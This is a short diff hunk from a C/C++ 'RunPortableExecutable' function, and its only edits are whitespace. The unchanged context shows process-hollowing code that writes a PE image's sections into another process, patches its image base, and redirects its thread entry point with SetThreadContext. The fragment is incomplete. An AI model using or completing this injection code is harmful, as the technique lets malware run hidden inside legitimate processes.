@@ -74,13 +74,13 @@ int RunPortableExecutable(void* Image)
 				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
 				{
 					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
-					
+
 					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
 						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
 				}
 				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
 					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
-				
+
 				// Move address of entry point to the eax register
 				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
 				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
